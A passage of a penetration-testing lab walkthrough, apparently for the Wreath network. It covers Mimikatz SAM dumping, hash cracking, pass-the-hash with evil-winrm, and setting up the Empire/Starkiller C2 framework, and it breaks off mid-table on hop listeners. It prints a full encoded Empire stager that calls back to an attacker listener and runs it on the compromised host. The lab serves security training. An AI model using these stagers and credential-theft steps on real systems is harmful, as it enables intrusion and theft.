First port forward the RDP port.

```shell
kali@attacker:~/wreath$ ssh -i ./id_rsa -L 3389:10.200.84.150:3389 root@10.200.84.200
[root@prod-serv ~]#
```

And connect

```shell
kali@attacker:~$ xfreerdp /v:localhost:3389 /u:USER-DA
[20:51:05:109] [349:350] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[20:51:05:109] [349:350] [WARN][com.freerdp.crypto] - CN = git-serv
Password:
```

Once authentication has successfully taken place, a new window will open giving GUI access to the target.

![wreath9](./assets/wreath9.png)

That said, we can do a lot more with xfreerdp. These switches are particularly useful:

- `/dynamic-resolution` -- allows us to resize the window, adjusting the resolution of the target in the process
- `/size:WIDTHxHEIGHT` -- sets a specific size for targets that don't resize automatically with /dynamic-resolution
- `+clipboard` -- enables clipboard support
- `/drive:LOCAL_DIRECTORY,SHARE_NAME` -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called `share`, you could use: `/drive:.,share`, with the period `.` referring to the current directory

When creating a shared drive, this can be accessed either from the command line as `\\tsclient\`, or through File Explorer under "This PC":

A useful directory to share is the `/usr/share/windows-resources` directory on Kali. This shares most of the Windows tools stockpiled on Kali, including `Mimikatz` which we will be using next. This would make the full command:

```shell
kali@attacker:~$ xfreerdp /v:localhost:3389 /u:USER-DA +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

As said, now we can access the share through File Explorer under `This PC`

![wreath10](./assets/wreath10.png)

Now we can use `Mimikatz` to dump the local account password hashes for this target.

Open up a cmd.exe or PowerShell as administrator and execute `mimikatz.exe`.

![wreath11](./assets/wreath11.png)

With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:

```text
privilege::debug
token::elevat
```

![wreath12](./assets/wreath12.png)

Now we can dump all of the SAM local password hashes:

```shell
lsadump::sam
```

Near the top of the results you will see the Administrator's NTLM hash:

![wreath13](./assets/wreath13.png)

There is a additional user `Thomas`, let's note that hash too.

![wreath14](./assets/wreath14.png)

I will try crack the hash using john the ripper.

First put the hash in a file and then run john with `--format=NT`. Here I use RockYou wordlist. You can list available formats using `john --list=formats`

It failed to crack the Administrator hash but Thomas hash was successfully cracked.

```shell
kali@attacker:~/wreath$ echo "<MASKED HASH>" > thomas.hash
kali@attacker:~/wreath$ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt thomas.hash
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
<MASKED PASSWORD>          (?)
1g 0:00:00:00 DONE (2024-02-18 23:17) 2.702g/s 20226Kp/s 20226Kc/s 20226KC/s <ALSO MASKED>
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

In the real world this would be enough to obtain stable access; however, in our current environment, the new account will be deleted if the network is reset.

For this reason you are encouraged to to use the evil-winrm built-in pass-the-hash technique using the Administrator hash we looted.

To do this we use the -H switch instead of the -p switch we used before.

```shell
kali@attacker:~$ evil-winrm -u Administrator -H <MASKED HASH> -P 5985 -i localhost

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Task 22 - Command and Control - Introduction

C2 Frameworks:

- [Cobalt Strike](https://www.cobaltstrike.com/)
- [Covenant](https://github.com/cobbr/Covenant)
- [Merlin](https://github.com/Ne0nd0g/merlin)
- [Shadow](https://github.com/bats3c/shad0w)
- [PoshC2](https://github.com/nettitude/PoshC2)

Resource for finding C2 frameworks [The C2 Matrix](https://www.thec2matrix.com/).

This room will use `Empire` and it's GUI extension `Starkiller` from [https://bc-security.org/](https://bc-security.org/)

## Task 23 - Command and Control - Empire: Installation

Install:

```shell
git clone --recursive https://github.com/BC-SECURITY/Empire.git
cd Empire
./setup/checkout-latest-tag.sh
./setup/install.sh
```

Start server:

```shell
kali@attacker:~/wreath/Empire$ ./ps-empire server
[sudo] password for kali: 
```

And wait for the complete message.

```shell
[INFO]: Application startup complete. 
[INFO]: Uvicorn running on http://0.0.0.0:1337 (Press CTRL+C to quit) 
```

Now, in new terminal start the client.

```shell
ali@attacker:~/wreath/Empire$ ./ps-empire client    
[sudo] password for kali: 

========================================================================================
 [Empire] Post-Exploitation Framework
========================================================================================
 [Version] 5.9.5 | [Web] https://github.com/BC-SECURITY/Empire
========================================================================================
 [Starkiller] Web UI | [Web] https://github.com/BC-SECURITY/Starkiller
========================================================================================
 [Documentation] | [Web] https://bc-security.gitbook.io/empire-wiki/
========================================================================================

                   ███████╗███╗   ███╗██████╗ ██╗██████╗    ███████╗
                   ██╔════╝████╗ ████║██╔══██╗██║██╔══██╗   ██╔════╝
                   █████╗  ██╔████╔██║██████╔╝██║██████╔╝   █████╗
                   ██╔══╝  ██║╚██╔╝██║██╔═══╝ ██║██╔══██╗   ██╔══╝
                   ███████╗██║ ╚═╝ ██║██║     ██║██║  █████║███████╗
                   ╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚════╝╚══════╝


              427 modules currently loaded

              1 listeners currently active

              0 agents currently active

Starkiller is now the recommended way to use Empire.
Try it out at http://localhost:1337/index.html
INFO: Connected to localhost 
(Empire) >



Connected: http://localhost:1337 | 0 agent(s) | 1 unread message(s)      
```

```text
With the server instance hosted locally this should connect automatically by default. If the Empire server was on a different machine then you would need to either change the connection information in the /usr/share/powershell-empire/empire/client/config.yaml file, or connect manually from the Empire CLI Client using connect HOSTNAME --username=USERNAME --password=PASSWORD.
```

To access `starkiller`, open a browser and navigate to `http://localhost:1337/index.html#/`.

![wreath15](./assets/wreath15.png)

And login with default Url `https://localhost:1337`, username `empireadmin` and password `password123`

![wreath16](./assets/wreath16.png)

Task 24 - Command and Control - Empire: Overview

Powershell Empire has several major sections to it.

- Listeners are fairly self-explanatory. They listen for a connection and facilitate further exploitation
- Stagers are essentially payloads generated by Empire to create a robust reverse shell in conjunction with a listener. They are the delivery mechanism for agents
- Agents are the equivalent of a Metasploit "Session". They are connections to compromised targets, and allow an attacker to further interact with the system
- Modules are used to in conjunction with agents to perform further exploitation. For example, they can work through an existing agent to dump the password hashes from the server

Empire also allows us to add in custom plugins which extend the functionality of the framework in various ways.

## Task 25 - Command and Control - Empire: Listeners

Listeners in Empire are used to receive connections from stagers. The default listener is the `HTTP` listener. This is what we will be using here, although there are many others available. It's worth noting that a single listener can be used more than once.

### Using Empire CLI Client

To select a listener we would use the `uselistener` command. To see all available listeners, type `uselistener ` (making sure to include the space at the end!) -- this should bring up a dropdown menu of available listeners:

```shell
(Empire) > uselistener
                        dbx
                        http
                        http_com
                        http_foreign
                        http_hop
                        http_malleable
                        onedrive
```

we will use the `http` listener and therefor execute `uselistener http`.

```shell
(Empire) > uselistener http

 id           http
 authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y
 description  Starts a http[s] listener that uses a GET/POST approach.
 category     client_server


┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value                               │ Required │ Description                         │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Name             │ http                                │ True     │ Name for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Host             │ http://172.17.0.2                   │ True     │ Hostname/IP for staging.            │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    │
│                  │                                     │          │ server.                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Port             │ 80                                  │ True     │ Port for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagingKey       │ 3j!zil2oJL5})QCK]>-T^nhy6gx9,cW[    │ True     │ Staging key for initial agent       │
│                  │                                     │          │ negotiation.                        │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultDelay     │ 5                                   │ True     │ Agent delay/reach back interval (in │
│                  │                                     │          │ seconds).                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultJitter    │ 0.0                                 │ True     │ Jitter in agent reachback interval  │
│                  │                                     │          │ (0.0-1.0).                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultLostLimit │ 60                                  │ True     │ Number of missed checkins before    │
│                  │                                     │          │ exiting                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultProfile   │ /admin/get.php,/news.php,/login/pro │ True     │ Default communication profile for   │
│                  │ cess.php|Mozilla/5.0 (Windows NT    │          │ the agent.                          │
│                  │ 6.1; WOW64; Trident/7.0; rv:11.0)   │          │                                     │
│                  │ like Gecko                          │          │                                     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ CertPath         │                                     │ False    │ Certificate path for https          │
│                  │                                     │          │ listeners.                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ KillDate         │                                     │ False    │ Date for the listener to exit       │
│                  │                                     │          │ (MM/dd/yyyy).                       │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ WorkingHours     │                                     │ False    │ Hours for the agent to operate      │
│                  │                                     │          │ (09:00-17:00).                      │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Headers          │ Server:Microsoft-IIS/7.5            │ True     │ Headers for the control server.     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Cookie           │ ASCrJpNDDXrp                        │ False    │ Custom Cookie Name                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerURI        │                                     │ False    │ URI for the stager. Must use        │
│                  │                                     │          │ /download/. Example:                │
│                  │                                     │          │ /download/stager.php                │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default                             │ False    │ User-agent string to use for the    │
│                  │                                     │          │ staging request (default, none, or  │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default                             │ False    │ Proxy to use for request (default,  │
│                  │                                     │          │ none, or other).                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   │
│                  │                                     │          │ ([domain\]username:password) to use │
│                  │                                     │          │ for request (default, none, or      │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ SlackURL         │                                     │ False    │ Your Slack Incoming Webhook URL to  │
│                  │                                     │          │ communicate with your Slack         │
│                  │                                     │          │ instance.                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature │
│                  │                                     │          │ using TLS ciphers.                  │
└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: uselistener/http) >
```

We can reprint the table by command `options` the context of the listener.

The syntax for setting options is identical to the Metasploit module options syntax -- `set OPTION VALUE`. Once again, a dropdown will appear showing us the available options after we type `set `.

At a bare minimum we must set the host to our own IP address and port, in this case the tun0:

```shell
(Empire: uselistener/http) > set Name CLIHTTP
INFO: Set Name to CLIHTTP
(Empire: uselistener/http) > set Host 10.50.85.93
INFO: Set Host to 10.50.85.93
(Empire: uselistener/http) > set Port 8000
INFO: Set Port to 8000
```

With the required options set, we can start the listener with: `execute`. We can then exit out of this menu using `back`, or exit to the main menu with `main`.

```shell
(Empire: uselistener/http) > execute
[+] Listener CLIHTTP successfully started
```

We can view our active listeners with `listeners` command:

```shell
(Empire: uselistener/http) > listeners

┌Listeners List┬──────────┬──────────────────────────────────────────┬─────────┐
│ ID │ Name    │ Template │ Created At                               │ Enabled │
├────┼─────────┼──────────┼──────────────────────────────────────────┼─────────┤
│ 1  │ CLIHTTP │ http     │ 2024-02-21 06:58:37 UTC (25 seconds ago) │ True    │
└────┴─────────┴──────────┴──────────────────────────────────────────┴─────────┘
```

When we want to stop a listener, we can use `kill LISTENER_NAME` to do so --  a dropdown menu with our active listeners will once again appear to assist.

We have a listener in the Empire CLI; now let's do the same thing in Starkiller!

### Using Starkiller

First go to the listeners menu.

![wreath17](./assets/wreath17.png)

Then click the `Create` button.

In the menu that pops up, set the Type to `http` and several new options will appear.

Notice that these options are identical to those we saw earlier in the CLI version.

Once again, set the Name, Host, and Port for the listener (make sure to use a different port from previously if you already have an Empire listener started!):

![wreath18](./assets/wreath18.png)

Finish by clicking the `Submit` button.

Go back to the Listeners menu by clicking on `Listeners` at the top left of the page. Back on the main Listeners page you will see your created listener!

![wreath19](./assets/wreath19.png)

Note: if you also have a listener set up in Empire, this will also show up here.

## Task 26 - Command and Control - Empire: Stagers

Stagers are Empire's payloads. They are used to connect back to waiting listeners, creating an agent when executed.

### Empire CLI

From the main Empire prompt, type `usestager ` (including the space!)  to get a list of available stagers in a dropdown menu.

There are a variety of options here. When in doubt, `multi_launcher` is often a good bet. In this case, let's go for `multi_bash`:

```shell
(Empire) > usestager multi_bash

 id           multi_bash                                                       
 authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y            
 description  Generates self-deleting Bash script to execute the Empire stage0 
              launcher.                                                        


┌Record Options───────────────────┬──────────┬─────────────────────────────────────┐
│ Name       │ Value              │ Required │ Description                         │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Listener   │                    │ True     │ Listener to generate stager for.    │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Language   │ python             │ True     │ Language of the stager to generate. │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ OutFile    │                    │ False    │ Filename that should be used for    │
│            │                    │          │ the generated output, otherwise     │
│            │                    │          │ returned as a string.               │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ SafeChecks │ True               │ True     │ Switch. Checks for LittleSnitch or  │
│            │                    │          │ a SandBox, exit the staging process │
│            │                    │          │ if true. Defaults to True.          │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent  │ default            │ False    │ User-agent string to use for the    │
│            │                    │          │ staging request (default, none, or  │
│            │                    │          │ other).                             │
├────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Bypasses   │ mattifestation etw │ False    │ Bypasses as a space separated list  │
│            │                    │          │ to be prepended to the launcher     │
└────────────┴────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: usestager/multi_bash) >

```

We can set options with `set OPTION VALUE`. For now let's only set the listener to the name of the listener we created in the previous task, then tell Empire to `execute`, creating the stager in our `/tmp` directory:

```shell
(Empire: usestager/multi_bash) > execute
INFO: Stager copied to clipboard 
#!/bin/bash
echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwcm9jZXNzOwpjbWQgPSAicHMgLWVmIHwgZ3JlcCBMaXR0bGVcIFNuaXRjaCB8IGdyZXAgLXYgZ3JlcCIKcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPSBwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKTsKCmltcG9ydCB1cmxsaWIucmVxdWVzdDsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMC41MC44NS45MyBJTkZPOjgwMDAnO3Q9Jy9hZG1pbi9nZXQucGhwJzsKcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3Qoc2VydmVyK3QpOwpwcm94eSA9IHVybGxpYi5yZXF1ZXN0LlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliLnJlcXVlc3QuYnVpbGRfb3BlbmVyKHByb3h5KTsKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLFVBKSwgKCJDb29raWUiLCAic2Vzc2lvbj1CWTBvdThLMXVBTFF3dnNKTCtKSXFOblQ4Tms9IildOwp1cmxsaWIucmVxdWVzdC5pbnN0YWxsX29wZW5lcihvKTsKYT11cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07CmRhdGE9YVs0Ol07CmtleT1JVisnQzxfM3A+UDU9O3VBYXIsZGI5WnF8YyowP1s3IUsrQk0nLmVuY29kZSgnVVRGLTgnKTsKUyxqLG91dD1saXN0KHJhbmdlKDI1NikpLDAsW107CmZvciBpIGluIGxpc3QocmFuZ2UoMjU2KSk6CiAgICBqPShqK1NbaV0ra2V5W2klbGVuKGtleSldKSUyNTY7CiAgICBTW2ldLFNbal09U1tqXSxTW2ldOwppPWo9MDsKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2OwogICAgaj0oaitTW2ldKSUyNTY7CiAgICBTW2ldLFNbal09U1tqXSxTW2ldOwogICAgb3V0LmFwcGVuZChjaHIoY2hhcl5TWyhTW2ldK1Nbal0pJTI1Nl0pKTsKZXhlYygnJy5qb2luKG91dCkpOw=='));" | python3 &
rm -f "$0"
exit

(Empire: usestager/multi_bash) >
```

We now need to get the stager to the target and executed, but that is a job for later on. In the meantime we can save the stager into a file on our own attacking machine then once again exit out of the stager menu with `back`.

### starkiller

Process for generating stagers with Starkiller is almost identical.

First we switch over to the Stagers menu on the left hand side of the interface:

![wreath20](./assets/wreath20.png)

click `Create` and once again select `multi_bash`.

We select the Listener we created in the previous task, then click `submit`, leaving the other options at their default values:

![wreath21](./assets/wreath21.png)

Finish by clicking `Submit`.

We can now navigate to stagers main menu where we are given the option to copy the stager to the clipboard by clicking on the `Actions` dropdown and selecting `Copy to Clipboard`:

![wreath22](./assets/wreath22.png)

Once again we would now have to execute this on the target.

## Task 27 - Command and Control - Empire: Agents

Now that we've started a listener and created a stager we can put them together to get an agent!

Let's place the agent on the compromised server.

### Empire CLI

We can now transfer the file containing the stager to the compromised server.Transfer to the `/tmp` directory and follow the `FILENAME-USERNAME.sh` naming convention.

However, in this case. If we study the script.

First row is the shebang, then we have the payload, and the last lines the post processing telling to delete it self.

In this case we can execute the payload directly on the target host `prod-serv`.

```shell
[root@prod-serv ~]# echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwcm9jZXNzOwpjbWQgPSAicHMgLWVmIHwgZ3JlcCBMaXR0bGVcIFNuaXRjaCB8IGdyZXAgLXYgZ3JlcCIKcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPSBwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKTsKCmltcG9ydCB1cmxsaWIucmVxdWVzdDsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMC41MC44NS45Mzo4MDAwJzt0PScvYWRtaW4vZ2V0LnBocCc7CnJlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHNlcnZlcit0KTsKcHJveHkgPSB1cmxsaWIucmVxdWVzdC5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYi5yZXF1ZXN0LmJ1aWxkX29wZW5lcihwcm94eSk7Cm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JyxVQSksICgiQ29va2llIiwgInNlc3Npb249NjcrZDJaSDRKdFRLeEZMMDRiOURiL2pCQlZRPSIpXTsKdXJsbGliLnJlcXVlc3QuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdOwpkYXRhPWFbNDpdOwprZXk9SVYrJ08sbzZSWjxhYlY3RnBbODpKLnNyfHsjO3RoZzEzX35tJy5lbmNvZGUoJ1VURi04Jyk7ClMsaixvdXQ9bGlzdChyYW5nZSgyNTYpKSwwLFtdOwpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2OwogICAgU1tpXSxTW2pdPVNbal0sU1tpXTsKaT1qPTA7CmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NjsKICAgIGo9KGorU1tpXSklMjU2OwogICAgU1tpXSxTW2pdPVNbal0sU1tpXTsKICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSk7CmV4ZWMoJycuam9pbihvdXQpKTs='));" | python3 &
[1] 2229
[root@prod-serv ~]# 
```

Now looking in Empire CLI we can se the agent checked in.

```shell
[+] New agent K1UO4RKY checked in
(Empire) >
```

And using `agents` command we can list all the agents.

```shell
(Empire: agents) > agents

┌Agents────┬───────────┬──────────┬───────────────┬──────────┬─────────┬──────┬───────┬─────────────────────────┬──────────┐
│ ID       │ Name      │ Language │ Internal IP   │ Username │ Process │ PID  │ Delay │ Last Seen               │ Listener │
├──────────┼───────────┼──────────┼───────────────┼──────────┼─────────┼──────┼───────┼─────────────────────────┼──────────┤
│ K1UO4RKY │ K1UO4RKY* │ python   │ 10.200.84.200 │ root     │ python3 │ 2301 │ 5/0.0 │ 2024-02-23 19:26:30 JST │ CLIHTTP  │
│          │           │          │               │          │         │      │       │ (2 seconds ago)         │          │
└──────────┴───────────┴──────────┴───────────────┴──────────┴─────────┴──────┴───────┴─────────────────────────┴──────────┘

(Empire: agents) >
```

To interact with an agent, we use `interact AGENT_NAME` -- as per usual a dropdown with auto completes will assist us here. This puts us into the context of the agent. We can view the full list of available commands with `help`:

```shell
(Empire: agents) > interact K1UO4RKY
(Empire: K1UO4RKY) > help

┌Help Options────┬─────────────────────────────────────┬────────────────────────────────────┐
│ Name           │ Description                         │ Usage                              │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ display        │ Display an agent property           │ display <property_name>            │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ download       │ Tasks specified agent to download a │ download <file_name>               │
│                │ file,                               │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ help           │ Display the help menu for the       │ help                               │
│                │ current menu                        │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ history        │ Display last number of task results │ history [<number_tasks>]           │
│                │ received.                           │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ info           │ Display agent info.                 │ info                               │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ jobs           │ View list of active jobs            │ jobs                               │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ kill_date      │ Set an agent's kill_date            │ kill_date <kill_date>              │
│                │ (01/01/2020)                        │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ kill_job       │ Kill an active jobs                 │ kill_job <task_id>                 │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ proxy          │ Proxy management menu for           │ proxy                              │
│                │ configuring agent proxies           │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ script_command │ Execute a function in the currently │ shell_command <script_cmd>         │
│                │ imported PowerShell script.         │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ script_import  │ Uploads a PowerShell script to the  │ script_import                      │
│                │ server and runs it in memory on the │ <local_script_location>            │
│                │ agent. Use '-p' for a file          │                                    │
│                │ selection dialog.                   │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ shell          │ Tasks the specified agent to        │ shell [--literal / -l] <shell_cmd> │
│                │ execute a shell command.            │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ sleep          │ Tasks specified agent to update     │ sleep <delay> <jitter>             │
│                │ delay (s) and jitter (0.0 - 1.0),   │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ socks          │ Create a socks proxy on the agent   │ socks [<port>]                     │
│                │ using in-band comms. (Default port: │                                    │
│                │ 1080)                               │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ sysinfo        │ Tasks the specified agent update    │ sysinfo                            │
│                │ sysinfo.                            │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ update_comms   │ Update the listener for an agent.   │ update_comms <listener_name>       │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ upload         │ Tasks specified agent to upload a   │ upload <local_file_directory>      │
│                │ file. Use '-p' for a file selection │ [<remote_file_directory>]          │
│                │ dialog.                             │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ view           │ View specific task and result       │ view <task_id>                     │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ vnc            │ Launch a VNC server on the agent    │ vnc                                │
│                │ and spawn a VNC client              │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ vnc_client     │ Launch a VNC client to a remote     │ vnc_client <address> <port>        │
│                │ server                              │ <password>                         │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ working_hours  │ Set an agent's working hours        │ working_hours <working_hours>      │
│                │ (9:00-17:00)                        │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ whoami         │ Tasks an agent to run the shell     │ whoami                             │
│                │ command 'whoami'                    │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ ps             │ Tasks an agent to run the shell     │ ps                                 │
│                │ command 'ps'                        │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ sc             │ Tasks the agent to run module       │ sc <SavePath>                      │
│                │ python_collection_osx_screenshot.   │                                    │
├────────────────┼─────────────────────────────────────┼────────────────────────────────────┤
│ keylog         │ Tasks the agent to run module       │ keylog <LogFile>                   │
│                │ python_collection_osx_keylogger.    │                                    │
└────────────────┴─────────────────────────────────────┴────────────────────────────────────┘

(Empire: K1UO4RKY) >
```

Further on we can kill the agent by going `back` and using `kill AGENT_NAME`.

```shell
(Empire: K1UO4RKY) > back
(Empire: agents) > kill K1UO4RKY
[>] Are you sure you want to kill K1UO4RKY? [y/N] y
INFO: Kill command sent to agent K1UO4RKY 
(Empire: agents) >
```

We can also rename agents using the command: `rename AGENT_NAME NEW_AGENT_NAME`

### starkiller

To interact with agents In Starkiller we go to the Agents tab on the left hand side of the screen, here we will see that our agent has checked in!

![wreath23](./assets/wreath23.png)

To interact with an agent in Starkiller we can either click on its name, or click on the "pop out" button in the actions menu.

This results in a menu which gives us access to a variety of amazing features, including the ability to execute modules (more on these soon), execute commands in an interactive shell, browse the file system, and much more. Be sure to play around with this before moving on!

![wreath24](./assets/wreath24.png)

To delete agents in Starkiller we can use either the trashcan icon in the pop-out agent Window, or the kill button in the action menu for the agent back in the Agents tab of Starkiller.

## Task 28 - Command and Control - Empire: Hop Listeners

Hop Listeners create what looks like a regular listener in our list of listeners (like the http listener we used before); however, rather than opening a port to receive a connection, hop listeners create files to be copied across to the compromised "jump" server and served from there. These files contain instructions to connect back to a normal (usually HTTP) listener on our attacking machine. As such, the hop listener in the listeners menu can be thought of as more of a placeholder -- a reference to be used when generating stagers.

The hop listener we will be working with is the most common kind: the `http_hop` listener.

When created, this will create a set of `.php` files which must be uploaded to the jump server (our compromised webserver) and served by a HTTP server. Under normal circumstances this would be a trivial task as the compromised server already has a webserver running; however, out of courtesy to anyone else attempting the network, we will not be using the installed webserver.

### Empire CLI

Switch into the context of the listener using `uselistener http_hop` from the main Empire menu (you may need to use back a few times to get out of any agents, etc). There are a few options we're interested in here:

```shell
(Empire) > uselistener http_hop

 id           http_hop                                                 
 authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y    
 description  Starts a http[s] listener that uses a GET/POST approach. 
 category     client_server                                            


┌Record Options──────┬────────────────────────────────┬──────────┬────────────────────────────────────┐
│ Name               │ Value                          │ Required │ Description                        │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Name               │ http_hop                       │ True     │ Name for the listener.             │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ RedirectListener   │                                │ True     │ Existing listener to redirect the  │
│                    │                                │          │ hop traffic to.                    │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Launcher           │ powershell -noP -sta -w 1 -enc │ True     │ Launcher string.                   │
